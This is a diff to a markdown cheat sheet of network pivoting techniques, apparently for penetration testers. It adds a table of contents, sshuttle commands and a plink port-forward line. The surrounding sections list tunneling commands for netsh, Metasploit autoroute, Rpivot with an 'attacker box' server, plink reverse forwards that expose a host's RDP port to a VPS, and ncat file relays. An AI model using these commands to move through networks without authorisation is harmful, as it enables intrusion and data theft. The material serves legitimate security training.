@@ -1,5 +1,25 @@
 # Network Pivoting Techniques
 
+## Summary
+
+* [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
+* [SSH](#ssh)
+  * [SOCKS Proxy](#socks-proxy)
+  * [Local Port Forwarding](#local-port-forwarding)
+  * [Remote Port Forwarding](#remote-port-forwarding)
+* [Proxychains](#proxychains)
+* [Web SOCKS - reGeorg](#web-socks---regeorg)
+* [Metasploit](#metasploit)
+* [sshuttle](#sshuttle)
+* [Rpivot](#rpivot)
+* [plink](#plink)
+* [ngrok](#ngrok)
+* [Basic Pivoting Types](#basic-pivoting-types)
+  * [Listen - Listen](#listen---listen)
+  * [Listen - Connect](#listen---connect)
+  * [Connect - Connect](#connect---connect)
+* [References](#references)
+
 ## Windows netsh Port Forwarding
 
 ```powershell
@@ -94,6 +114,13 @@ run autoroute -s 192.168.57.0/24
 use auxiliary/server/socks4a
 ```
 
+## sshuttle
+
+```powershell
+sshuttle -vvr user@10.10.10.10 10.1.1.0/24
+sshuttle -vvr username@pivot_host 10.2.2.0/24 
+```
+
 ## Rpivot
 
 Server (Attacker box)
@@ -128,6 +155,7 @@ python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [pro
 ```powershell
 plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389    --> exposes the RDP port of the machine in the port 3390 of the SSH Server
 plink -l root -pw mypassword 192.168.18.84 -R
+plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445
 plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
 ```
 
@@ -155,7 +183,7 @@ unzip ngrok-stable-linux-amd64.zip
 | Listen - Connect  | Normal redirect.                            |
 | Connect - Connect | Can’t bind, so connect to bridge two hosts  |
 
-## Listen - Listen
+### Listen - Listen
 
 | Type              | Use Case                                    |
 | :-------------    | :------------------------------------------ |
@@ -164,7 +192,7 @@ unzip ngrok-stable-linux-amd64.zip
 | remote host 1     | `ncat localhost 8080 < file`                |
 | remote host 2     | `ncat localhost 9090 > newfile`             |
 
-## Listen - Connect
+### Listen - Connect
 
 | Type              | Use Case                                                        |
 | :-------------    | :------------------------------------------                     |
@@ -173,7 +201,7 @@ unzip ngrok-stable-linux-amd64.zip
 | remote host 1     | `ncat localhost -p 8080 < file`                                 |
 | remote host 2     | `ncat -l -p 9090 > newfile`                                     |
 
-## Connect - Connect
+### Connect - Connect
 
 | Type              | Use Case                                                                   |
 | :-------------    | :------------------------------------------                                |
